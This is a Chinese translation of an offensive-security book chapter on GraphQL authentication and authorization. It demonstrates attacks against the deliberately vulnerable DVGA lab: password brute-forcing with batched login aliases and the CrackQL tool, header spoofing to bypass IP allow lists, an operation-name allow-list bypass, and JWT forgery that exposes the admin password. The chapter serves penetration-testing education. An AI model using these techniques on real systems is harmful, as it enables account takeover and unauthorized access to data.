# 第七章：身份验证和授权绕过

![](img/chapterart.png)

默认情况下，GraphQL 没有身份验证或授权控制。因此，生态系统创建了自己的机制，或采纳了传统系统中的机制。在本章中，我们将介绍常见的 GraphQL 身份验证和授权实现。然后，我们将讨论针对它们的一些弱点的攻击。

*身份验证*是客户端向服务器证明其身份的机制。它回答了这样一个问题：用户是否真的是他们所说的人？身份验证攻击瞄准客户端的身份，试图窃取凭证或伪造凭证来与服务器进行身份验证，代表用户执行某些操作，或窃取他们可以访问的数据。

*授权*控制负责授予数据访问权限，并确保实体（无论是人类还是机器）所执行的操作与其分配的角色、组和权限匹配。授权攻击试图绕过安全控制，或者在其漏洞中开辟缺口，使攻击者能够执行本不可能的操作。例如，他们可能会获得未经授权的系统数据访问权限，或执行特权操作，如设置其他用户的密码。

身份验证和授权控制的实现可能会很具挑战性。特别是在应用程序从零开始创建自己的机制，而不是使用许多经过严格测试的框架时，这一点尤为明显。对这些控制进行安全测试也是一项复杂的任务；安全工具（如 API 应用程序扫描器）在识别授权和身份验证问题时常常力不从心。其主要原因之一是扫描器对应用程序的业务逻辑缺乏上下文理解。

多年来，黑客通过利用弱密码、默认凭证、伪造的令牌、缺陷的帐户恢复过程、重放攻击和不完善的速率限制控制来突破身份验证和授权防御。这些弱点不仅在 GraphQL 实现中可以被利用，而且在许多情况下，GraphQL 强大的客户端功能实际上帮助黑客优化了他们的攻击，正如你很快将了解的那样。

## GraphQL 中的身份验证和授权现状

GraphQL 规范在身份验证和授权方面没有为实现者提供明确的指引。缺乏详细的标准导致开发者从各种库、工具和配置中选择并部署自己的 GraphQL 身份验证和授权控制，这常常导致漏洞和实现差距。

在本节中，我们将深入探讨面向生态系统的身份验证和授权服务、库以及可用于 GraphQL 的插件。总体来说，这些方法遵循两种不同的架构部署模型：带内（in-band）和带外（out-of-band）。

### 带内 vs. 带外

在*内联*认证和授权架构中，开发者直接在 GraphQL API 中实现客户端登录、注册、基于角色的访问控制和其他权限控制。提供客户端应用数据的同一 GraphQL 实例还控制着认证客户端的逻辑，并授予其查看数据的权限。内联 GraphQL 架构通常托管查询或变更操作，允许客户端将凭证发送到 API。API 负责验证这些凭证，然后向客户端发放令牌。

*外联*认证和授权架构将访问控制和权限逻辑实现于单独的内部 Web 应用服务或外部系统中。在这种架构中，GraphQL API 不负责管理客户端登录、注册，甚至是访问控制。相反，它将授权决策交给另一个组件，如 API 网关、容器旁车或网络上的其他服务器。这使得开发者可以将授权逻辑与 GraphQL 应用程序解耦。

在这两种架构风格中，内联架构通常更容易受到认证和授权攻击。它们增加的复杂性大幅提高了 API 的攻击面。这些 API 经常为服务的每个入口点复制权限逻辑，正如你将在本章后面看到的那样，作为黑客，我们可以利用即便是最细微的不对齐控制。

因此，一些 GraphQL 生态系统的贡献者主张将认证和授权逻辑保持在 GraphQL 之外。目前的行业最佳实践是将授权逻辑委托给应用程序的*业务逻辑层*，该层作为所有业务领域规则的单一真实来源。它应该位于 GraphQL 层与*持久层*（也称为*数据库*或*数据存储层*）之间，如图 7-1 所示。

![](img/f07001.png)

图 7-1：网关、API、业务和持久层

相比之下，整个 GraphQL API 的认证应发生在外部或第三方*网关层*，该层将已认证的用户上下文传递给 API。

### 常见方法

在你进行 GraphQL 黑客实验时，无法预知会遇到哪些类型的控制。然而，本节列出了一些我们在研究和测试中见过的常见方法。通过了解这些技术，你将更有能力发现它们，并评估它们可能受到的漏洞。

#### HTTP 基本认证

最基本的 GraphQL 认证方法之一是*HTTP 基本认证*。在 RFC 7617 中定义的此方案涉及将一个 Base64 编码的用户名和密码包含在客户端请求的头部。头部如下所示：

```
Authorization: Basic `<base64_encoded_credential>`
```

Base64 编码的用户名和密码通过冒号连接成一个单一凭证。

基本认证是一种简单的技术，不需要使用 cookies、会话标识符或登录页面。为了检测基本认证，我们可以使用浏览器。图 7-2 是一个示例，展示了浏览器自动弹出窗口，用于收集和编码基本认证的凭证。

![](img/f07002.png)

图 7-2：基本认证的浏览器弹出示例

这种方法的一个缺点是在通过 HTTP 向 GraphQL 服务器传输凭证时缺乏保密性保护。想象一下如下的基本认证头：

```
Authorization: Basic YWRtaW46YmxhY2toYXRncmFwaHFsCg==
```

由于凭证使用 Base64 编码，并且每次请求都会发送（相比之下，其他系统可能在登录时生成临时会话令牌），因此盗取这些凭证的攻击窗口较大。通过使用 TLS 可以缓解在未加密通道上传输凭证的风险。然而，如果凭证被窃取，攻击者可以相对容易地将其 Base64 解码。要测试这一点，请打开终端并运行以下命令：

```
# echo "YWRtaW46YmxhY2toYXRncmFwaHFsCg==" | base64 -d
admin:blackhatgraphql
```

基本认证的另一个缺点是缺乏任何支持的登出功能，无法使凭证失效。窃取基本认证凭证的攻击者可以永久访问 API，直到管理员更改凭证。基本认证很少在生产级应用中使用。你更有可能在测试或暂存环境中遇到这种机制，作为一种快速且简便的保护应用方法，但一切皆有可能！

#### OAuth 2.0 和 JSON Web Token

*开放授权（OAuth）* 是一种授权框架，允许第三方临时访问 HTTP 服务，例如 GraphQL API。这种访问是通过用户与 API 之间的授权过程，或者通过允许第三方应用代表用户获取访问权限来实现的。

如果你曾经点击类似 *使用 Google 登录* 的按钮登录到网站，你可能已经遇到过 OAuth。在本节中，我们仅触及 OAuth 2.0 的表面，但如果你有兴趣了解更多信息，可以参考 [`datatracker.ietf.org/doc/html/rfc6749`](https://datatracker.ietf.org/doc/html/rfc6749)。

想象一下，你正在对一个具有登录机制的应用程序进行渗透测试，例如一个电子商务应用程序，以防止未经授权的访问。OAuth 协议允许电子商务应用程序（在 OAuth 术语中为*客户端*）向*资源拥有者*（你，渗透测试人员，必须登录的人）请求授权。当授权请求被授予（也称为*授权许可*）时，电子商务应用程序将获得一个访问令牌，可以用来访问资源服务器上的某些资源。这个资源服务器可以是一个 GraphQL 服务器。它将检查访问令牌，如果它有效，则通过允许客户端执行查询到某个资源（也称为*受保护资源*）来提供服务。

利用 OAuth 2.0 框架的应用程序可以使用*JSON Web 令牌（JWT）*作为其令牌格式。JWT 是一种开放标准（在 RFC 7519 中定义），允许通过 JSON 对象在系统之间安全传输信息。服务器可以通过数字签名和加密验证 JWT 令牌。JWT 令牌包含三个不同的部分，这些部分经过 Base64 编码，并由句点（`.`）分隔，如示例 7-1 所示。这三部分分别是头部、负载和签名。

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9**.**eyJ0eXBlIjoiYWNjZXNzIiwiaWF0Ijo
xNjU2NDY0MDIyLCJuYmYiOjE2NTY0NjQwMjIsImp0aSI6ImY0OThmZmQxLWU0YzctNGU
5Mi05ZTRhLWJiNzRiZmVjZTE4ZiIsImlkZW50aXR5Ijoib3BlcmF0b3IiLCJleHAiOjE
2NTY0NzEyMjJ9**.**NHs6JiLDONJsC9LpJzdBB8enXzIrqI0Cvqojj8SqA4s
```

示例 7-1：一个示例 JWT 令牌

*头部*，即 JWT 令牌的第一部分，定义了两个重要细节：令牌类型和签名算法。当我们对这个头部进行 Base64 解码时，我们应该能够看到它的内容：

```
# echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d

{
  "typ": "JWT",
  "alg": "HS256"
}
```

`typ`键是一个头部参数，声明 JWT 令牌的结构媒体类型信息。在这种情况下，媒体类型是`JWT`。可能的媒体类型完整列表可以在[`www.iana.org/assignments/media-types/media-types.xhtml`](https://www.iana.org/assignments/media-types/media-types.xhtml)找到。这个头部参数被认为是可选的，但可以设置，以便读取头部的应用程序知道对象类型的结构。

`alg`键定义 JWT 令牌的签名算法，用于确保令牌的完整性。这个键可以表示不同的签名算法，如下所示：

+   无数字签名（`none`）

+   HMAC 与 SHA-256（`HS256`）

+   HMAC 与 SHA-384（`HS384`）

+   RSA 与 SHA-256（`RS256`）

+   RSA 与 SHA-384（`RS384`）

*基于哈希的消息认证码（HMAC）*是一种对称加密认证技术（意味着它使用共享的秘密），而*Rivest-Shamir-Adleman（RSA）*则是非对称加密（使用公钥和私钥对）。签名算法的完整列表可以在 RFC 7518 中找到。

针对使用 JWT 的应用程序的常见攻击之一是将`alg`头参数设置为`none`。如果应用程序接受未签名的 JWT 令牌，黑客可以篡改 JWT 令牌，以冒充另一个用户或执行敏感操作。

*载荷* 部分，或者说是 JWT 的第二部分，包含了关于用户的相关信息，以及开发者可能觉得有用的任何额外数据。在我们的示例中，解码后的载荷应匹配以下输出：

```
# echo "eyJ0eXBlIjoiYWNjZXNzIiwiaWF0IjoxNjU2NDY0MDIyLCJuYmYiOjE2NTY0NjQwMjIs
**Imp0aSI6ImY0OThmZmQxLWU0YzctNGU5Mi05ZTRhLWJiNzRiZmVjZTE4ZiIsImlkZW50aXR5Ijoi**
**b3BlcmF0b3IiLCJleHAiOjE2NTY0NzEyMjJ9" | base64 -d**
{
  "type": "access",
  "iat": 1656464022,
  "nbf": 1656464022,
  "jti": "f498ffd1-e4c7-4e92-9e4a-bb74bfece18f",
  "identity": "operator",
  "exp": 1656471222
}
```

大多数 JWT 载荷都会包含一些标准元素，称为 *声明*，包括一个 `iat` 字段，它表示 JWT 被创建的时间戳，以及 `exp` 字段，它表示过期时间戳，格式为 Unix 时间戳。你可以通过阅读 RFC 7519 文档了解更多关于 JWT 字段的信息。

JWT 的最后一部分是 *签名*，它确保整个 JWT 没有被篡改。对 JWT 进行任何手动更改都会使签名失效，从而导致 GraphQL 服务器拒绝该令牌。正如你将很快学到的，GraphQL 服务器签名验证中的漏洞可能允许攻击者伪造 JWT 令牌。在第 178 页的“伪造和泄露 JWT 凭证”一节中，我们将探讨一些常见的 JWT 实现漏洞及如何利用它们。

#### GraphQL Modules

在测试基于 JavaScript 的 GraphQL 实现时，你可能会遇到一个名为 *GraphQL Modules* 的实用库，它由 The Guild（[`www.the-guild.dev`](https://www.the-guild.dev)）构建。这个库将 GraphQL 架构分解为更小的、可重用的模块，作为中间件使用。开发者可以使用这些模块来包装他们的解析器。列表 7-2 是身份验证模块，它为 GraphQL 客户端提供了标准的登录、注册和用户查询变更操作。

```
extend type Query {
  me: User
}

type Mutation {
   login(username: String!, password: String!): User
   signup(username: String!, password: String!): User
}

extend type User {
  username: String!
} 
```

列表 7-2：来自 GraphQL Modules 库的身份验证模块

如你所见，模块定义了一个名为 `me` 的查询，该查询返回一个 `User` 对象，以及两个变更操作，分别为 `login` 和 `signup`，它们接受 `username` 和 `password` 参数并返回一个 `User` 对象。

开发者也可以在他们的 GraphQL API 中实现自定义的 `login` 查询和 `signup` 变更操作，而无需使用外部库。在第 171 页的“身份验证测试”一节中，我们将教你如何通过使用第五章介绍的批量查询和第二章安装的 CrackQL 来破解这里提到的内联身份验证操作。

#### GraphQL Shield

*GraphQL Shield* 是由 The Guild 构建的另一个中间件库，用于在 GraphQL API 中生成授权层。它允许开发者定义规则，允许或拒绝客户端访问。列表 7-3 显示了由 GraphQL Shield 保护的查询和变更操作，定义了访问每个查询所需的权限和角色。

```
const permissions = shield({
  Query: {
    frontPage: not(isAuthenticated),
    fruits: and(isAuthenticated, or(isAdmin, isEditor)),
    customers: and(isAuthenticated, isAdmin),
  },
  Mutation: {
    addFruitToBasket: isAuthenticated,
  },
  Fruit: isAuthenticated,
  Customer: isAdmin,
})
```

列表 7-3：一个 GraphQL Shield 代码示例

希望使用 `frontPage` 查询的客户端不需要进行身份验证，正如规则 `not(isAuthenticated)` 所定义的那样；而要使用 `customers` 查询，他们必须同时满足已认证和具有管理员用户的条件，正如 `and(isAuthenticated, isAdmin)` 所示。`and` 运算符要求两个条件都为真，才能授予访问权限。

一个开发者社区积极维护着 GraphQL Shield，并不断改进它。截止本文写作时，GraphQL Shield 中最后一个文档化的漏洞是一个授权绕过漏洞，发生在 2020 年，并出现在早于 6.0.6 的版本中。

在进行代码审查时，查找名为`fallbackRule`的 GraphQL Shield 组件。此规则可以在未定义规则时决定请求是否默认允许或拒绝。默认情况下，`fallbackRule` 设置为`allow`。要了解更多关于 GraphQL Shield 规则的信息，请参阅官方文档 [`www.graphql-shield.com/docs/rules#logic-rules`](https://www.graphql-shield.com/docs/rules#logic-rules)。

#### 架构指令

GraphQL 部署可能会使用自定义的架构级指令来对某些操作和字段应用身份验证和授权控制。通过修饰架构组件，这些自定义指令可以控制客户端在 API 中可以做什么以及不能做什么。我们可以通过它们在查询级、类型级、字段级等地方执行安全控制。

graphql-directive-auth 库 ([`github.com/graphql-community/graphql-directive-auth`](https://github.com/graphql-community/graphql-directive-auth)) 提供了一个示例，展示了开发者如何使用指令来解决其 API 中的身份验证和授权问题。在某些实现中，`@auth` 指令接受一个 `requires` 参数，该参数采用一个字符串值，表示用户查询字段所需的角色或组。客户端通常通过 JWT 负载发送这些用户组或角色。指令逻辑会分析这些信息，从而决定是否允许或拒绝访问架构中的受保护元素。

授权指令可能具有各种其他名称或参数。表 7-1 是一个常见的指令列表，你可能会在内省时遇到这些指令。

表 7-1：常见的 GraphQL 授权指令

| **指令名称** | **参数名称** | **参数类型** |
| --- | --- | --- |
| `@auth` | `requires` | `String` |
| `@protect` | `role` | `String` |
| `@hasRole` | `role` | `String` |

一些 `@auth` 指令可能还使用一个名为 `permissions` 的参数，该参数接受一个范围授权列表。

#### 基于 IP 的允许列表

一些 GraphQL API，特别是那些部署在内部系统中并非公开的系统，可能选择不对单个客户端请求进行身份验证。相反，它们可能选择使用一个来源 IP 地址的允许列表来授权客户端。在这种技术中，服务器通过将网络请求中包含的客户端 IP 地址与地址或网络范围列表（如 *10.0.0.0/24*）进行比对来检查客户端 IP 地址。

这个 IP 地址通常通过公共网络设备传递给 API，比如反向代理或负载均衡器。然后，应用程序将尝试通过查找传入请求中的 HTTP 头来发现 IP 地址。一些常见的用于此目的的 HTTP 头包括 `X-Forwarded-For`、`X-Real-IP`、`X-Originating-IP` 和 `X-Host`。

由于客户端可以伪造这些头信息，反向代理可能会将错误信息盲目转发给应用程序。例如，以下是如何使用 cURL 向 DVGA 传递自定义 `X-Forwarded-For` 头信息的示例：

```
# curl -X POST http://localhost:5013/graphql -d '{"query":"{ __typename }"}'
**-H "Content-Type: application/json" -H "X-Forwarded-For: 10.0.0.1"**
```

如果应用程序只允许来自网络 *10.0.0.0/24* 的请求访问 GraphQL API，那么在后续阶段注入此类头信息可能会让攻击者绕过基于 IP 的允许列表，并与应用程序进行通信。

## 认证测试

在测试 GraphQL 认证时，你会遇到一些没有经过任何认证层保护的操作。例如，未认证的用户可能可以访问查询，而只有认证用户才能执行更敏感的、更改状态的操作（例如 mutations）。你可能会在博客中看到这种模型：任何客户端都可以读取文章，而只有认证用户可以发表评论。

对目标 GraphQL 服务器和模式进行彻底扫描以查找任何未保护的查询非常重要。本节将概述如何检测和击败某些 GraphQL 认证控制。

### 检测认证层

确定目标 GraphQL 应用程序是否受到认证层保护的最佳方法之一是通过发送金丝雀查询。可以使用第六章中的任意 introspection 查询，或者自己编写查询来探测模式中的一系列操作、对象和类型。根据你收到的响应，你可能能够检测到使用的认证类型，以及认证控制实施的层级。特别要注意状态码、错误信息以及对查询变体的响应差异。

#### HTTP 状态码

验证 GraphQL 目标是否存在某种认证层的可靠方法是分析你在发送金丝雀查询后收到的 HTTP 响应。大多数 GraphQL 实现即使查询包含拼写错误或其他错误，也会始终返回 *200 OK* 状态码。然而，如果你收到 *403 Forbidden Error*，这可能意味着类似网关或 WAF 的带外认证和授权控制已阻止你的请求进入 API。

#### 错误信息

错误信息显然可以揭示认证控制的存在，但它们也可能告诉我们 API 需要哪种类型的认证，以及这些检查在架构中的位置。表 7-2 显示了常见的带内 GraphQL 认证错误信息列表以及默认情况下可能引发这些错误信息的认证实现。

表 7-2：常见的 GraphQL 认证错误

| **错误信息** | **可能的认证实现** |
| --- | --- |
| `认证凭据缺失。需要授权头并且必须包含一个值。` | 使用 JSON Web Token 的 OAuth 2.0 Bearer |
| `未授权！` | GraphQL Shield |

| `未登录` `需要认证` |

`需要 API 密钥` | GraphQL 模块 |

| `无效令牌！` `无效角色！` | graphql-directive-auth |
| --- | --- |

错误消息可以自定义，可能与此处显示的消息不同。请参考第六章，了解如何滥用错误以从 GraphQL 中提取有价值信息的附加信息。例如，*200 OK*状态码与错误消息的组合可能表示需要进行身份验证。由于这些详细信息可能因 GraphQL API 而异，我们建议检查所有途径。

#### 与身份验证相关的字段

另一个检测身份验证层的好方法是使用内省查询来识别任何与身份验证相关的查询或变异操作。根据设计，在带内 GraphQL 身份验证中需要身份验证、会话管理和基于身份的操作。例如，客户端很可能需要发送未经身份验证的变异请求，执行登录和注册操作来创建和访问他们的经过身份验证的帐户。我们可以使用 Listing 7-4 中的内省查询来分析模式，以查找与身份验证相关的任何变异操作。

```
{
  __schema {
    mutationType {
      name
      kind
      fields {
        name
        description
      }
    }
  }
}
```

列表 7-4：用于识别所有变异的内省查询

检查查询是否返回类似于以下名称的变异名称：

1.  `me`

1.  `login`

1.  `logout`

1.  `signup`

1.  `register`

1.  `createUser`

1.  `createAccount`

如果是这样，您可以推断 API 具有身份验证层，这意味着您可以开始测试其抵御密码暴力攻击的韧性。

### 利用查询批处理进行密码暴力破解

一种经典的身份验证攻击，密码暴力破解针对未能实施速率限制或其他自动化账户接管预防控制系统。攻击者发送许多登录请求到系统，试图正确猜测密码来执行此操作。这种程序化攻击通常接受可能的用户凭据字典或迭代字符序列以生成可能的凭据组合。

安全控制，例如 WAF（Web 应用程序防火墙），非常适合防止单个客户端发出过多的 HTTP 请求，通常在检测到此类活动时会进行节流或禁止客户端。然而，在第五章中，我们介绍了*查询批处理*，这实质上允许客户端在单个 HTTP 请求中打包多个查询操作。我们可以利用这种批处理功能来通过一次 HTTP 请求中的多个操作来暴力破解凭据，有效地规避诸如 WAF 之类的安全控制。

有两种批处理操作类型：基于数组和基于别名。像 BatchQL 这样的工具利用基于数组的查询批处理将多个操作发送到单个请求中。然而，如果您回到第三章中图 3-4 展示的 GraphQL 威胁矩阵截图，您会注意到很少有 GraphQL 实现支持这种类型的批处理。相比之下，所有主要的 GraphQL 实现支持基于别名的查询批处理，因为它在 GraphQL 规范中有定义。

让我们使用别名对 DVGA 的 GraphQL 认证层执行密码暴力破解攻击。首先，我们需要在一个 GraphQL 文档中包含多个不同凭证的登录操作。列表 7-5 显示了一个 GraphQL 文档，包含了 10 个登录突变别名，针对 DVGA 中的*admin*和*operator*用户账户。你还可以在本书的 GitHub 仓库中找到该查询，网址为 [`github.com/dolevf/Black-Hat-GraphQL/blob/master/ch07/password-brute-force.graphql`](https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch07/password-brute-force.graphql)。

每个别名操作都有一个唯一的标识符，以及一个目标用户名和一个潜在密码。如果其中一个操作成功，服务器应该在响应中返回被攻击用户的 JWT 访问令牌（`accessToken`）。

```
mutation {
    alias1: login(username: "admin", password: "admin") {
      accessToken
    }
    alias2: login(username: "admin", password: "password") {
      accessToken
    }
    alias3: login(username: "admin", password: "pass") {
      accessToken
    }
    alias4: login(username: "admin", password: "pass123") {
      accessToken
    }
    alias5: login(username: "admin", password: "password123") {
      accessToken
    }
    alias6: login(username: "operator", password: "operator") {
      accessToken
    }
    alias7: login(username: "operator", password: "password") {
      accessToken
    }
    alias8: login(username: "operator", password: "pass") {
      accessToken
    }
 alias9: login(username: "operator", password: "pass123"){
      accessToken
    }
    alias10: login(username: "operator", password: "password123"){
      accessToken
    }
}
```

列表 7-5：使用批量查询进行密码暴力破解的示例

对 DVGA 执行这个密码暴力破解查询将产生如下的大量响应。如你所见，大部分数据由`身份验证失败`错误组成。然而，对于`alias10`，我们收到了有效的`accessToken`，这意味着我们成功破解了*operator*的密码，该密码为*password123*。

```
{
  "errors": [
    {
      "message": "Authentication Failure",
      "locations": [
        {
          "line": 2,
          "column": 5
        }
      ],
      "path": [
        "alias1"
      ]
    },
`--snip--`
    {
      "message": "Authentication Failure",
      "locations": [
        {
          "line": 26,
          "column": 5
        }
      ],
      "path": [
        "alias9"
      ]
    }
  ],
  "data": {
    "alias1": null,
`--snip--`
    "alias9": null,
    "alias10": {
      "accessToken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzI
iwiaWF0IjoxNjU2OTcxMDc5LCJuYmYiOjE2NTY5NzEwNzksImp0aSI6IjQ3NmEwYTYxLTk0OGUtNDZmO
S05ZDBmLTFlMzk3MDAxMTNjYiIsImlkZW50aXR5Ijoib3BlcmF0b3IiLCJleHAiOjE2NTY5NzgyNzl9.NJ
ZOugXBwG-0oEcT2UtH-xeBFwqxS0_5Ag1Y7-L3EgI"
    }
```

即使有安全控制通过禁止客户端每分钟发出超过五次 HTTP 登录请求来保护 API，这种攻击也能绕过这种逻辑，因为我们在执行 10 次登录尝试时只发送了一个 HTTP 请求。

### 使用 CrackQL 进行密码暴力破解

手动构建成功进行密码暴力破解所需的大型 GraphQL 文档将非常耗时。在第二章中，你安装了一个名为*CrackQL*的 GraphQL 密码暴力破解和模糊测试工具。该工具接受一个单一的 GraphQL 查询或突变操作，并使用 CSV 字典自动生成别名有效载荷。让我们运行相同的密码暴力破解攻击，不过这次使用 CrackQL 来自动化它。

进入 CrackQL 目录，然后执行对 DVGA 的暴力破解攻击。`-t`（目标）参数指定目标 GraphQL 端点 URL，`-q`（查询）参数接受一个示例查询（`login.graphql`），`-i`（输入）参数定义了攻击中使用的用户名和密码列表。`--verbose` 参数允许我们查看额外的信息，如发送给 DVGA 的最终有效载荷。

```
# cd ~/CrackQL
# python3 CrackQL.py -t http://localhost:5013/graphql -q sample-queries/login.graphql
**-i sample-inputs/usernames_and_passwords.csv --verbose**
```

CrackQL 预安装了一个示例的用户名和密码 CSV 字典，以及*login.graphql*查询，如列表 7-6 所示。正如你所看到的，它包含一个包含两个嵌入变量（`username`和`password`）的单一登录突变。CrackQL 使用 Jinja 模板语法，因此变量通过双大括号（`{{}}`）传递。

```
mutation {
  login(username: {{username|str}}, password: {{password|str}}) {
    accessToken
   }
}
```

列表 7-6：CrackQL 登录暴力破解查询示例

当你执行 CrackQL 命令时，该工具会自动从 CSV 文件中获取每个用户名和密码变量，并将它们注入到同一查询文档中的重复登录操作中。CrackQL 的详细输出提供了有效载荷详情以及输出结果：

```
Data:
[{'alias1': {'data': None,
             'inputs': {'password': 'admin', 'username': 'admin'}}},
*--snip--*

 {'alias9': {'data': None,
             'inputs': {'password': 'operator', 'username': 'pass123'}}},
 {'**alias10**': {'data': {'**accessToken**': '**eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzIiwiaWF0IjoxNjU3MDQ2NjI5LCJuYmYiOjE2N**
**TcwNDY2MjksImp0aSI6IjVkMzhkM2Y5LWNjNTUtNDcyYy1iNzRhLThiN2FlMzEyNGFlMiIsImlkZW50aXR5Ijoib3BlcmF0**
**b3IiLCJleHAiOjE2NTcwNTM4Mjl9.Ba3zfvSZqjDmyLFdx71WCs-7vidaxpUfs2X3UK3zZBA'**},
              'inputs': {'password': 'password123', 'username': 'operator'}}}]
Errors:
[{'alias1': {'error': 'Authentication Failure',
             'inputs': {'password': 'admin', 'username': 'admin'}}},
 {'alias2': {'error': 'Authentication Failure',
             'inputs': {'password': 'admin', 'username': 'password'}}},
*--snip--*

 {'alias9': {'error': 'Authentication Failure',
             'inputs': {'password': 'password123', 'username': 'operator'}}}]
[*] Writing to directory results/localhost:5013_5bab6e
```

在 GraphQL 查询成本控制阻止执行大批量查询的情况下，CrackQL 提供了一个可选的 `-b`（批处理）参数，允许你定义一个更有限的别名操作集，从而让攻击更难被发现。

你还可以使用 CrackQL 执行多种其他攻击。通过使用一次性密码令牌的列表，CrackQL 可以暴力破解双因素认证。它还可以执行账户枚举攻击，通过自动扫描有效的电子邮件或用户名，或通过模糊测试唯一的对象标识符来利用*不安全的直接对象引用（IDOR）*漏洞，在这种漏洞中，通过直接引用对象标识符，我们能够在未授权的情况下访问该对象。

在对认证查询进行攻击时，你可能需要传递身份验证头部信息，可能还需要 cookie。CrackQL 允许你通过 *config.py* 文件来做到这一点，该文件接受 `COOKIES` 和 `HEADERS` 变量。以下是如何为工具提供自定义头部和 cookie 的示例：

```
# cat config.py

HEADERS = {"Authorization": "Bearer mytoken"}
COOKIES = {"session:"session-secret"}
```

在进行渗透测试时，可以通过使用类似 Firefox 开发者工具的网络标签页来检查网络流量，获取这些头部信息。查看你在初次登录到网站后发送的任何 GraphQL 请求。此时，你应该看到独特的身份验证头部或会话 cookie。

### 使用允许列表的操作名称

某些内嵌式 GraphQL 实现可能会使一些查询和突变对未认证客户端公开可用，例如登录或账户注册的查询。这些部署中的一些使用*基于操作名称的允许列表*，这是一种较弱的执行控制，除非操作名称在允许列表中，否则会拒绝所有未认证的请求。然而，操作名称可以由客户端定义，因此攻击者可以通过简单地伪造操作名称来绕过这些身份验证机制。

以下是一个未认证的突变示例。如你所见，它将允许用户注册一个新账户：

```
mutation RegisterAccount {
    register(username: "operator", password: "password"){
        user_id
    }
}
```

实现可以选择通过使用其操作名称 `RegisterAccount` 来将此 `register` 操作加入允许列表。作为攻击者，我们可以利用这一点，通过发送类似清单 7-7 中的请求来绕过验证。

```
mutation RegisterAccount {
    withdrawal(amount: 100.00, from: "ACT001", dest: "ACT002"){
        confirmationCode
    }
}
```

清单 7-7：一个可以通过使用允许列表操作名称绕过身份验证的示例操作

我们使用了允许的操作名称通过一个提款突变来提取资金。

### 伪造和泄露 JWT 凭证

虽然 JWT 令牌可以使用 JSON Web Encryption（RFC 7516）进行加密，但通常并不会。而当它们不加密时，可能会泄漏敏感数据。例如，看一下以下载荷部分：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.**eyJ0eXBlIjoiYWNjZXNzIiwiaWF0IjoxNj**
**U3MDQ2NjI5LCJuYmYiOjE2NTcwNDY2MjksImp0aSI6IjVkMzhkM2Y5LWNjNTUtNDcyYy1iN**
**zRhLThiN2FlMzEyNGFlMiIsImlkZW50aXR5Ijoib3BlcmF0b3IiLCJleHAiOjE2NTcwNTM4**
**MjksImFwaV90b2tlbiI6IkFQSV9TRUNSRVRfUEFTU1dPUkQifQ**.iIQ9zMRP2bA0Yx8p7INu
rfC-PcVz3-KqfzEE4uQICbc
```

当我们对载荷进行 Base64 解码时，我们会发现在载荷部分中有一个硬编码的凭据，`api_token`：

```
{
  "type": "access",
  "iat": 1657046629,
  "nbf": 1657046629,
  "jti": "5d38d3f9-cc55-472c-b74a-8b7ae3124ae2",
  "identity": "operator",
  "exp": 1657053829,
  **"api_token":"API_SECRET_PASSWORD"**
}
```

我们可以通过解码和测试 JWT 令牌的内容来深入了解应用程序。

另一种绕过弱 JWT 认证控制的方法是伪造自己的 JWT 令牌。如果 GraphQL API 未能正确验证 JWT 令牌的签名，它将容易受到基于伪造的攻击，攻击者可以编码他们自己的用户详细信息。

让我们通过伪造管理员的 JWT 令牌对 DVGA 进行 JWT 伪造攻击。首先，复制我们在“通过查询批处理暴力破解密码”中成功暴力破解*操作员*密码时收到的`accessToken` JWT。我们可以通过将其作为`me`查询操作中的`token`参数发送来验证`accessToken`是否有效：

```
query {
  me(token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzIiwiaWF0Ij
oxNjU3MDQ2NjI5LCJuYmYiOjE2NTcwNDY2MjksImp0aSI6IjVkMzhkM2Y5LWNjNTUtNDcyYy1iNzRhLT
hiN2FlMzEyNGFlMiIsImlkZW50aXR5Ijoib3BlcmF0b3IiLCJleHAiOjE2NTcwNTM4Mjl9.Ba3zfvSZq
jDmyLFdx71WCs-7vidaxpUfs2X3UK3zZBA"){
    id
    username
    password
  }
}
```

DVGA 将根据 JWT 中的身份声明对用户进行身份验证，并使用`me`查询操作返回经过身份验证的用户对象字段：

```
{
  "data": {
    "me": {
      "id": "2",
      "username": "operator",
      "password": "******"
    }
  }
}
```

接下来，让我们将 JWT 字符串粘贴到 [`jwt.io`](https://jwt.io)，如图 7-3 所示。该网站将自动解码并以更易读的形式呈现三个 JWT 段。

在右侧面板中，我们可以直接修改解码后的载荷 JSON 数据，将`"identity": "operator"`行更改为`"identity": "admin"`。您会注意到 [`jwt.io`](https://jwt.io) 将自动在左侧面板中编码载荷更改。

![](img/f07003.png)

图 7-3：使用 [`jwt.io`](https://jwt.io) 解码后的 DVGA 运算符的`accessToken`

现在尝试使用伪造的 JWT 令牌进行`me`操作。只需复制 JWT 并粘贴到查询的`token`参数中。由于 DVGA 未验证 JWT 签名，它将使用我们伪造的 JWT 令牌对我们的请求进行身份验证并返回管理员用户的密码：

```
{
  "data": {
    "me": {
      "id": "1",
      "username": "admin",
      "password": "changeme"
    }
  }
}
```

当客户端更改 JWT 令牌时，其签名应变为无效。不验证此签名的 GraphQL API 将容易受到基于伪造的攻击。

## 授权测试

与认证一样，开发人员可以采用多种方法实现授权。当给定有限的 GraphQL 用户帐户时，作为黑客，我们应该看看我们能够提升多少权限。特别是，我们应确定是否能够绕过旨在防止我们读取用户数据或执行某些提升功能的控制。

像 REST 一样，GraphQL 可能会因 API 处理权限控制不当而容易受到各种授权攻击的威胁。在函数级别未能保护未经授权访问可能导致敏感数据泄露或执行破坏性操作。

GraphQL 特有的授权漏洞通常发生在权限检查发生在解析器级别，或者在任何业务逻辑或状态变化执行后。让我们学习如何检测这些授权方法，并探索它们可能面临的攻击。

### 检测授权层

我们可以通过几种方式来检测 API 是否使用授权控制，以及使用的是哪种类型的控制。

#### 查找模式指令

我们之前提到过，开发者有时通过使用模式指令来实现授权。如果你有权限访问 API 的 SDL 文件，你可以识别这些模式指令。或者，你可以发送一个专门的 introspection 查询，比如 列表 7-8 中的查询。

```
query {
  __schema {
    directives {
      name
      args {
        name
      }
    }
  }
}
```

列表 7-8：获取指令名称和参数的 introspection 查询

